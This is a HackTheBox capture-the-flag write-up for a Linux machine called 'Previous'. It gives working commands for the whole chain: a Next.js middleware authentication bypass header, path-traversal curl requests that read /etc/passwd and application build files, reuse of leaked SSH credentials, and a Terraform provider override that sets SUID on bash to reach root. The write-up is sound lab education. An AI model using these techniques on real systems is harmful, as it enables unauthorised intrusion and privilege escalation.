# Previous — HackTheBox Writeup

**OS:** Linux · **Difficulty:** Medium
**Author:** Mridul / thanatos
**Terminal Prefix:** `thanatos@kali:/home/thanatos/Desktop/htb/machines/previous$`

---

## 🛰️ TL;DR

You exploit a **Next.js middleware authentication bypass (CVE‑2025‑29927)** using a crafted `X-Middleware-Subrequest` header → gain access to an internal **LFI endpoint** → dump the `.next` build → extract hardcoded admin credentials → SSH as **jeremy** → use a **sudo Terraform provider override** (`TF_CLI_CONFIG_FILE` + dev_overrides) to load a malicious provider → set SUID on `/bin/bash` → become **root**.

---

## 🔍 1. Recon — Nmap & Web Enumeration

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/previous$ nmap previous.htb -A
```

Results:

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Dirsearch enumeration:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/previous$ dirsearch -u http://previous.htb
```

Many `/api/...` endpoints redirect to `/signin`. This hints the API is protected by NextAuth middleware.

---

## 🔓 2. Authentication Bypass — CVE‑2025‑29927

Certain vulnerable versions of **Next.js** allow bypassing middleware authentication when a crafted internal header is supplied:

```
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

Adding this header causes Next.js to treat the request as **trusted internal middleware**, skipping authentication.

Now we can enumerate protected `/api/*` routes.

---

## 📁 3. Finding the Vulnerable LFI Endpoint `/api/download`

Parameter fuzzing:

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' \
 -w /usr/share/fuzzDicts/paramDict/AllParam.txt \
 -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

We find a parameter that behaves differently:

```
example
```

Test LFI:

```bash
curl 'http://previous.htb/api/download?example=../../../../etc/passwd' \
 -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

Boom — **LFI works**.

We also dump environment variables to confirm pathing:

```bash
curl 'http://previous.htb/api/download?example=../../../../proc/self/environ'
```

Shows:

```
PWD=/app
NODE_VERSION=18.x
NODE_ENV=production
HOME=/home/nextjs
```

So the Next.js app is running from `/app`.

---

## 🔎 4. Dumping `.next` Build Files for Hidden Credentials

Next.js stores all API logic inside the compiled build directory:

```
/app/.next/
```

Dump the route manifest:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json'
```

We find the path to the NextAuth backend:

```
/api/auth/[...nextauth]
```

Dump the compiled NextAuth handler:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js'
```

Inside, we see:

```
if (username === "jeremy" && password === "MyNameIsJeremyAndILovePancakes") {
   return { id: "1", name: "Jeremy" }
}
```

Credentials FOUND. ✔️

---

## 👤 5. Logging In & Shell as jeremy

SSH login:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/previous$ ssh jeremy@previous.htb
# password: MyNameIsJeremyAndILovePancakes
```

Check environment:

```bash
jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy)
```

We now have a stable foothold.

---

## 🧱 6. Privilege Escalation — Terraform Misuse

Check sudo:

```bash
jeremy@previous:~$ sudo -l
```

Output:

```
(root) /usr/bin/terraform -chdir=/opt/examples apply
```

Important:

* `!env_reset` → environment variables **are preserved**.
* So we can set a malicious Terraform config using `TF_CLI_CONFIG_FILE`.

`/opt/examples` content:

```
main.tf
.terraform/
.terraform.lock.hcl
terraform.tfstate
```

`main.tf` requires provider:

```
previous.htb/terraform/examples
```

Terraform allows **dev_overrides**, letting us replace a provider binary with our own. This is official Terraform behaviour (developer override mode).

---

## ☠️ 7. Create a Malicious Local Provider

### Fake provider binary

```bash
jeremy@previous:~$ mkdir -p privesc
jeremy@previous:~$ cat > privesc/terraform-provider-examples_v0.1_linux_amd64 << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

jeremy@previous:~$ chmod +x privesc/terraform-provider-examples_v0.1_linux_amd64
```

### Dev Override Config (`dev.tfrc`)

```bash
jeremy@previous:~$ cat > privesc/dev.tfrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/examples" = "/home/jeremy/privesc"
  }
  direct {}
}
EOF
```

Export config:

```bash
jeremy@previous:~$ export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc
```

---

## 🚀 Execute Terraform as ROOT

Now run the sudo‑allowed Terraform command:

```bash
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform attempts to load the provider → executes our malicious file → sets SUID on `/bin/bash`.

Verify:

```bash
jeremy@previous:~$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Now become root:

```bash
jeremy@previous:~$ /bin/bash -p
root@previous:~# id
uid=0(root) gid=0(root)
```

Root flag:

```bash
root@previous:~# cat /root/root.txt
```

---

## 🏁 Pwned.

**Foothold via Next.js CVE → LFI → source leak → SSH → Terraform provider hijack → root.**
